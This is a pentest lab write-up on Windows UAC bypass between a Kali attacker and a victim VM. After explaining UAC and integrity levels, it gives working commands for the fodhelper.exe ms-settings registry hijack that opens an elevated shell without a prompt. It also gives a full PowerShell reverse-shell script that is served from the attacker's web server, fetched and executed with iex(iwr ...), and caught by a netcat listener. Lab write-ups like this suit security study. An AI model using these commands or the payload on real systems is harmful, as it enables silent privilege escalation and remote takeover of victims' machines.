<h1 align="center"> Windows UAC Bypass </h1>

<img width="1024" height="550" alt="Windows UAC" src="https://github.com/user-attachments/assets/2357f45a-45cc-441d-8209-1ab1da4cbb64" />

---

## Scope
- **Attacker**: Kali Linux (IP `192.168.127.128)`
- **Victim**: (IP `192.168.127.148)`


---


## Table of Contents






---



# INTRODUCTION TO WINDOWS UAC BYPASS

## UAC Bypass:

### What is UAC (User Account Control)?
- **UAC (User Account Control)** is Windows' security feature that prevents unauthorized changes to the operating system. When you try to perform administrative tasks, UAC prompts for confirmation or administrator credentials.

- **Simple Analogy**: Think of UAC as a bouncer at a VIP club. Even if you're on the guest list (administrator account), the bouncer still checks your ID before letting you in.

- **UAC** limits when apps can run with elevated (`administrator`) privileges. By default, processes start with standard rights (medium integrity), even if you’re logged in as an administrator. When an app needs higher integrity (e.g., to write to system locations), Windows shows a prompt asking you to confirm or provide credentials. This reduces the risk of silent elevation by malware and forces explicit consent.



### What is UAC Bypass?


## Integrity levels and elevation flow

- **Default integrity**: Most apps start at medium integrity—enough for user tasks, not system changes.
- **Elevation request**: When an app needs admin rights, it triggers a UAC prompt.
- **Consent vs credentials**: Admin accounts typically see a consent prompt; standard users must enter admin credentials.
- **Isolation**: Prompts can appear on the secure desktop, isolating them from other apps to prevent tampering.

### UAC prompt levels explained

- **Level 0 (No prompt)**:
  - **Effect**: Elevation happens silently.
  - **Risk**: High—malware can gain admin rights without user interaction.
- **Level 1 (Prompt for credentials on secure desktop)**:  
  - **Effect**: Requires admin username/password; appears on secure desktop.
  - **Use case**: Strict environments; standard users must authenticate.
- **Level 2 (Prompt for consent on secure desktop)**:  
  - **Effect**: Admins click “Yes/No”; appears on secure desktop.
  - **Use case**: Balanced security—isolated prompt, minimal friction.
- **Level 3 (Prompt for credentials on normal desktop)**:  
  - **Effect**: Requires admin credentials; not isolated.
  - **Risk**: Other apps could potentially interact with the prompt.
- **Level 4 (Prompt for consent on normal desktop)**:  
  - **Effect**: Admins click “Yes/No”; not isolated.
  - **Risk**: Lower than Level 0, but weaker than secure desktop.
- **Level 5 — Prompt for consent for non‑Windows binaries**:  
  - **Effect**: Consent prompts only for non‑Microsoft executables; Windows-signed binaries may auto-elevate.
  - **Use case**: Convenience-focused; trust in Microsoft-signed code.


### Secure desktop vs normal desktop

#### Secure Desktop:
- **Isolation**: UAC prompt runs in a separate, protected desktop session.
- **Protection**: Blocks other processes from sending clicks/keys or overlaying UI.
- **Visual cue**: Screen dims; only the UAC dialog is interactive.

#### Normal Desktop:
- **Integration**: Prompt appears like any other window.
- **Risk**: UI spoofing or input injection is more plausible.



## Understanding UAC 

### UAC Levels 
- Always notify (Most secure)
- Notify me only when apps try to make changes (Default)
- Notify me only when apps try to make changes (do not dim desktop)
- Never notify (Least secure - Disables UAC)


### UAC Internals - How It Works
````
User Application (Medium Integrity) → Request Admin → UAC Prompt → 
If Approved → COM Elevation Moniker → Admin Process (High Integrity)
````




## Mandatory Integrity Control (MIC)
**MIC** enforces access control based on integrity levels, not just user permissions. It’s designed to prevent lower-trust processes from tampering with higher-trust ones — even if they belong to the same user.
- Think of it as a vertical barrier:
  - **A low-integrity** process can’t write to a medium-integrity file.
  - **A medium-integrity** app can’t inject into a high-integrity service.
- This protects sensitive system components from being modified by less trusted software.


### Key Components:
- **Consent.exe** - Shows the UAC prompt
- **AppInfo.dll** - Handles elevation requests
- **mshta.exe**, **wscript.exe** - Often used in bypasses
- **AutoElevation** - Some Microsoft binaries auto-elevate
- **Integrity Levels**:
  - **Low** (Internet Explorer)
  - **Medium** (Standard user apps) 
  - **High** (Admin apps)
  - **System** (Kernel)


### Here are the four standard integrity Levels used in MIC:

| Integrity Level | Typical Use Case                                       | Access Restrictions                                        |
| --------------- | ------------------------------------------------------ | ---------------------------------------------------------- |
| Low             | Web browsers in protected mode, sandboxed applications | Cannot write to medium, high, or system-level objects      |
| Medium          | Standard user applications (Explorer, Notepad, etc.)   | Can write to medium-level objects, but not high or system  |
| High            | Elevated applications (Run as Administrator)           | Can write to medium and high-level objects, but not system |
| System          | Core OS processes (LSASS, Winlogon, etc.)              | Highest level; only system-level processes can interact    |







## How to view and change UAC settings (GUI)

### Open UAC settings:  
- Action: Press `Ctrl + S` → type `UAC` → select `Change User Account Control settings`:
<img width="779" height="680" alt="image" src="https://github.com/user-attachments/assets/8939dadd-fd54-4566-9e73-2621d7e1482e" />



### **Understand the slider**:  
Action: The slider maps to common policies (not exactly the numeric levels above).
- Always notify: Closest to secure desktop consent for all changes.
- Default: Notify when apps try to make changes (secure desktop on by default).
- Notify without dimming: Normal desktop prompts.
- Never notify: Equivalent to Level 0 behavior.

<img width="744" height="552" alt="image" src="https://github.com/user-attachments/assets/9cac74e7-fca8-4915-91fd-7f161822a5b5" />

- Choose your level:  
  - **Recommendation**: Keep secure desktop enabled (screen dims) and avoid `Never notify`.
- Apply and test:  
  - **Action**: Click `OK`, then run an app that requires elevation (e.g., an installer) to confirm behavior.




## Relationship Between UAC & MIC

- **MIC** = The rules and vault doors (who can go where)
- **UAC** = The security guard who asks “Are you sure?” before letting you into the vault


### To Recap
| Term                              | Role                                                        | Analogy                                  |
| --------------------------------- | ----------------------------------------------------------- | ---------------------------------------- |
| MIC (Mandatory Integrity Control) | Enforces boundaries based on trust/integrity levels         | The bank’s vault rules                   |
| UAC (User Account Control)        | Requests user approval before crossing integrity boundaries | A security guard asking, “Are you sure?” |


### Visua Summery
````
[Standard App] → Tries to do something risky
         ↓
     [UAC Prompt] → "Do you allow this?"
         ↓ (if YES)
[App gets Elevated] → Now runs at HIGH INTEGRITY
         ↓
     [MIC allows it] → Because now it has the right "trust level"
````








---




# WINDOWS UAC BYPASS METHODOLOGY


## 1. Enumerate UAC Configuration

### 1. IS UAC Enabled?
#### Check on PowerShell:
````
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
````
<img width="1512" height="138" alt="image" src="https://github.com/user-attachments/assets/a1492500-c086-4834-9bd7-7aad4ecab964" />


#### CMD
````
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
````
<img width="863" height="96" alt="image" src="https://github.com/user-attachments/assets/6c660fdc-d95e-4a00-8f4e-8771a1e98d2e" />

Now we see:
````
EnableLUA    REG_DWORD    0x1
````
- `1` = UAC is **ENABLED**
- `0` = UAC is **DISABLED**

- **EnableUA**: Stand for `Enable Local User Account Control`



### 2. What UAC Behavior Level Is Set?
UAC has **4 behavior levels** for administrators (and 3 for standard users). The key registry value is `ConsentPromptBehaviorAdmin`.

#### UAC Prompt behavior Values
| Value | Behavior                                                                  |
| ----- | ------------------------------------------------------------------------- |
| 0     | Never notify → Administrators run all apps as admin (no prompt)           |
| 1     | Prompt for consent on the secure desktop (default on most systems)        |
| 2     | Prompt for credentials on the secure desktop (most secure)                |
| 3     | Prompt for consent on the desktop (less secure, often used in enterprise) |
| 4     | Prompt for credentials on the desktop                                     |

- On modern Windows (Win 10/11), `1` is default.
- `0`: Dangerous, Turn off UAC prompt entirely.


#### How to Check Current Setting:
````
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object ConsentPromptBehaviorAdmin
````
<img width="1712" height="148" alt="image" src="https://github.com/user-attachments/assets/d4234f72-ba33-46ba-8155-361d1d483e14" />

- Now we see it `5`.

- Or on CMD
````
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
````
<img width="979" height="98" alt="image" src="https://github.com/user-attachments/assets/3e57bf88-11cb-4176-b312-ab9a527030cf" />

- And we see it
````
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
````
- **Value Name**:  `ConsentPromptBehaviorAdmin`
- **Type**: `REG_DWORD`
- **Value**: `0x5 (decimal 5)` 
- This setting controls how UAC prompts behave for administrators in Admin Approval Mode.

- **Our system is configured to show a UAC consent prompt for admins, on the secure desktop**.


 
### 3. How to Change UAC Settings
We can change these values via `registry` or `PowerShell`.

#### Using Registry Editor (GUI)
- Press `Win + R`, type `regedit`, hit Enter.
<img width="402" height="257" alt="image" src="https://github.com/user-attachments/assets/7c49e495-ebf1-41a0-ae73-79651ee6371f" />

<img width="457" height="313" alt="image" src="https://github.com/user-attachments/assets/0e58618c-32f5-4b36-868f-ebcb58210b95" />

- After Navigate to:
- We can use following this: `HKEY_LOCAL_MACHINE` -> `SOFTWARE` -> `Microsoft` -> `Windows` -> `CurrentVersion` -> `Policies` -> `System`:
<img width="1913" height="903" alt="image" src="https://github.com/user-attachments/assets/67ddf1b2-72bc-4332-911c-947c717b0515" />

- After find `Windows` -> `CurrentVersion`:
<img width="867" height="892" alt="image" src="https://github.com/user-attachments/assets/ccda722d-7532-452e-afc7-7d66fe4143fd" />

- After find `Policies` -> `System`:
<img width="790" height="896" alt="image" src="https://github.com/user-attachments/assets/7da0759d-6d27-4c91-956f-ffcef004512c" />

- Or we can use this:
````
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
````
<img width="886" height="897" alt="image" src="https://github.com/user-attachments/assets/4a8e7017-96fc-4d0f-9f8a-2cfcad6aa4af" />

- `Double-click` on `EnableLUA` → set to `1` (enable UAC) or `0` (disable).
- `Double-click` on `ConsentPromptBehaviorAdmin` → set to `1` (default), `2` (most secure), etc.
<img width="1251" height="900" alt="image" src="https://github.com/user-attachments/assets/6be2b9a2-baea-4833-8210-aed4c380b2ec" />

- After `Restart` our **computer** for changes to take effect.

##### Verify UAC Settings After Reboot
````
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA, ConsentPromptBehaviorAdmin
````
<img width="1893" height="157" alt="image" src="https://github.com/user-attachments/assets/37e0e217-e3db-41aa-911e-d206dd7bcbbe" />

- Now we see:
````
        1                          1
````



#### Using PowerShell (Recommended)
##### Enable UAC:
````
Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name "EnableLUA" -Value 1
````
<img width="1582" height="75" alt="image" src="https://github.com/user-attachments/assets/ff437982-734e-4393-9060-4039f7063ece" />

##### Set UAC Prompt Level (Admin):
````
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name "ConsentPromptBehaviorAdmin" -Value 1
````
<img width="1741" height="98" alt="image" src="https://github.com/user-attachments/assets/29fd65db-67ce-4cbb-9522-e54e60f43be4" />

> Note: In this we use this command with **administrator**.


- To check it:
````
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select EnableLUA
````
<img width="1517" height="157" alt="image" src="https://github.com/user-attachments/assets/8ce3e04f-0627-4dd2-9125-325ef0d73caf" />


##### Common Values:
| Value | Meaning     | Description                     |
| ----- | ----------- | ------------------------------- |
| 0     | No prompt   | No UAC prompt shown (dangerous) |
| 1     | Default     | Prompts on the secure desktop   |
| 2     | Most secure | Asks for administrator password |



#### Using CMD (Legacy)
````
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 1 /f
````
<img width="1367" height="206" alt="image" src="https://github.com/user-attachments/assets/0ad6f2f0-5122-4c47-9fe3-763b339423c5" />

- `/f` forces overwrite without asking.



#### Reboot Required?
- Changes to `EnableLUA` or `ConsentPromptBehaviorAdmin` require a reboot to take effect.
````
Restart-Computer -Force
````
- Or use cmd:
````
shutdown /r /t 0
````
- But in this I was `Restart` it.

- `/r` = restart, `/t 0` = immediately



### 3. Check & Fix UAC Settings
````
$uac = Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA, ConsentPromptBehaviorAdmin
Write-Host "UAC Enabled: $($uac.EnableLUA)"
Write-Host "Admin Prompt Level: $($uac.ConsentPromptBehaviorAdmin)"

if ($uac.EnableLUA -eq 0) {
    Write-Host "Enabling UAC..."
    Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name "EnableLUA" -Value 1
}

if ($uac.ConsentPromptBehaviorAdmin -ne 1) {
    Write-Host "Setting UAC prompt level to default (1)..."
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name "ConsentPromptBehaviorAdmin" -Value 1
}

Write-Host "Reboot required for changes to take effect."
````
<img width="1890" height="537" alt="image" src="https://github.com/user-attachments/assets/2d08bda2-9cde-477a-a8bd-ecc413d1c522" />

- Also this we can create file `.ps1`:
````
notepad Check-UAC.ps1
````
````
$uac = Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA, ConsentPromptBehaviorAdmin
Write-Host "UAC Enabled: $($uac.EnableLUA)"
Write-Host "Admin Prompt Level: $($uac.ConsentPromptBehaviorAdmin)"

if ($uac.EnableLUA -eq 0) {
    Write-Host "Enabling UAC..."
    Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name "EnableLUA" -Value 1
}

if ($uac.ConsentPromptBehaviorAdmin -ne 1) {
    Write-Host "Setting UAC prompt level to default (1)..."
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name "ConsentPromptBehaviorAdmin" -Value 1
}

Write-Host "Reboot required for changes to take effect."
````
<img width="1093" height="521" alt="image" src="https://github.com/user-attachments/assets/b74ad1da-323a-44b7-9ae8-9d0df23ba25e" />

- Run code:
````
.\Check-UAC.ps1
````
<img width="611" height="201" alt="image" src="https://github.com/user-attachments/assets/4182913e-109c-4821-838a-ebb01ae43fe2" />


---




## 2. Basic UAC Bypass Techniques

### Basic FodHelper Bypass
``FodHelper.exe`` is a Windows feature that manages optional features. It has a registry vulnerability that allows privilege escalation.



#### Check if we're in Administrators group
````
net localgroup administrators
````
<img width="1065" height="262" alt="image" src="https://github.com/user-attachments/assets/9c0c7678-d29e-4634-8bf3-05e33d322233" />


#### Create registry entries
````
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
````
<img width="880" height="107" alt="image" src="https://github.com/user-attachments/assets/e2967a5c-a80c-41fe-865e-ff0c7e31a600" />

- Using reg query:
````
reg query "HKCU\Software\Classes\ms-settings\shell\open\command" /ve
````
<img width="916" height="177" alt="image" src="https://github.com/user-attachments/assets/04ae1428-df45-47cf-92cc-b47c28d13194" />

- Now we see our file.

- Start hijack:
````
start fodhelper.exe
````
<img width="354" height="105" alt="image" src="https://github.com/user-attachments/assets/45dcb1b9-c0b4-4d71-a1b4-acff616cfbc6" />


- After we use this command , it will show this:
<img width="1914" height="901" alt="image" src="https://github.com/user-attachments/assets/0d5caef7-e9f3-4797-b013-b2743b189a61" />




#### Set the default value (payload):  
````
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
reg query "HKCU\Software\Classes\ms-settings\shell\open\command" /ve
reg query "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute
````
<img width="947" height="457" alt="image" src="https://github.com/user-attachments/assets/be560d35-91ad-4c38-a2fb-269001a2c788" />


##### Trigger the hijack
````
start fodhelper.exe
````
After we ran this command we will see one more `Terminal` show:
<img width="986" height="643" alt="image" src="https://github.com/user-attachments/assets/12c2bc16-2e9d-4a06-b151-7730112fb83d" />

- `fodhelper.exe` is a trusted auto‑elevated binary.
- It calls `ms-settings`.
- Because of your registry hijack, it should launch `cmd.exe` without showing a **UAC prompt**.


##### Verify elevation
````
whoami /groups | findstr Mandatory
````
<img width="1297" height="477" alt="image" src="https://github.com/user-attachments/assets/a7be7cee-b6c4-4803-be67-3e666d4a493c" />

Now we see:
````
Mandatory Label\High Mandatory Level   Label   S-1-16-12288
````
- **Mandatory Label** is the integrity level assigned to the process.
- **High Mandatory Level** means the process is running with elevated privileges (administrator rights).
- This shows that your hijack worked: when you launched `fodhelper.exe`, it spawned `cmd.exe` in a **high-integrity context without a UAC prompt**.


##### Clean up afterward 
````
reg delete "HKCU\Software\Classes\ms-settings" /f
````
- Or
````
reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f
````
<img width="566" height="110" alt="image" src="https://github.com/user-attachments/assets/9ff34425-ca93-425e-b4fa-f86d1977bd0c" />

- Now we got success.


### Explanation:
- FodHelper tries to open `ms-settings`:
- It checks registry for handler
- Finds our malicious command
- Executes it with high integrity


---



## 3. Bypass UAC

Open `Powershell` (Normal User).


### Hijack the ms-settings Protocol

#### Start-Process -Verb RunsAs:
````
Start-Process -FilePath "powershell.exe" -Verb RunAs
````
<img width="911" height="119" alt="image" src="https://github.com/user-attachments/assets/2bea851a-ef8f-4a2b-8da8-a2fce09b5c92" />

- After we run thos command the powershell will take to input password:
<img width="455" height="461" alt="image" src="https://github.com/user-attachments/assets/bac89305-0968-4fd9-8dd6-5c7e635b1748" />


- After it will show new `powershell`:
<img width="1316" height="785" alt="image" src="https://github.com/user-attachments/assets/ed26e7e0-11cc-4c19-b6b5-8fba711e8791" />



````
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg delete "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f 2>nul
````
<img width="911" height="145" alt="image" src="https://github.com/user-attachments/assets/74f11cee-09f7-4080-9ec7-380c025284b7" />

- This tells Windows: “When opening Settings, run `cmd.exe` instead.”


#### Trigger the Bypass
````
start fodhelper.exe
````
<img width="608" height="580" alt="image" src="https://github.com/user-attachments/assets/c2477467-cb5f-4363-8c3f-8294ed961961" />

- `fodhelper.exe` is normally used to open the Optional Features settings panel.
- Since the registry hijack redirects its execution to `cmd.exe`, you get:
- A Command Prompt with elevated privileges (if the hijack works).
- The Settings window still opens as part of `fodhelper.exe`'s default behavior.

#### Why it show this?
It shows the Optional Features window because `fodhelper.exe` is designed to open that settings panel. But due to the registry hijack, it also launches `cmd.exe` with elevated privileges, bypassing UAC. So you get both: the settings window and an admin command prompt.


---


## 4. Use meterpreter or Payload

### Using PAyload:

#### On kali 
````
ifconfig
````
- Or
````
ip a
````
<img width="818" height="410" alt="image" src="https://github.com/user-attachments/assets/e3909621-9796-4d06-8897-5c28eda4ff25" />

- Now I see my IP is `192.168.127.128`.

#### Simple Reverse Shell (cmd.exe)

##### Create a PowerShell Reverse Shell Payload

- Create a file called `payload.ps1` on Kali:
````
sudo nano /var/www/html/payload.ps1
````
````
$client = New-Object System.Net.Sockets.TCPClient('192.168.127.128',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
````
<img width="1901" height="887" alt="image" src="https://github.com/user-attachments/assets/fd535a62-028d-4717-b3f5-99d66e02af4a" />

- To save it press `Ctrl + O ` -> `Enter` -> `Ctrl + X`.


````
cd /var/www/html/
ls
````
<img width="1103" height="330" alt="image" src="https://github.com/user-attachments/assets/5c487091-177b-41cb-9318-3d2f21669519" />

- or
````
cat /var/www/html/payload.ps1
````
<img width="1040" height="353" alt="image" src="https://github.com/user-attachments/assets/3adf6d1d-46e6-4d73-94dd-2185c80e8b65" />


#### Start HTTP Server on Kali
````
sudo python3 -m http.server 80
````
<img width="613" height="152" alt="image" src="https://github.com/user-attachments/assets/81f12e70-3c08-4bdd-b671-5fd20103db1c" />


#### On attacker Start Netcat Listener
````
nc -nvlp 4444
````
<img width="459" height="143" alt="image" src="https://github.com/user-attachments/assets/02167644-21de-49e4-99a5-5d19e217cb96" />



#### Use this to spawn a Meterpreter shell or reverse shell with elevated rights:
````
Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-c iex(iwr http://192.168.127.128/payload.ps1)"
````
<img width="1847" height="649" alt="image" src="https://github.com/user-attachments/assets/7f624b60-1e2f-48fa-a168-28a91db20ea4" />

- Now we got successful.

- After back to attacker.

#### On Attacker:
<img width="883" height="257" alt="image" src="https://github.com/user-attachments/assets/090afe88-9373-47db-bc5a-82f299aa6781" />

- Now we got target shell.

----

<h2 align="center"> Completed - Windows UAC Bypass </h2>

<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
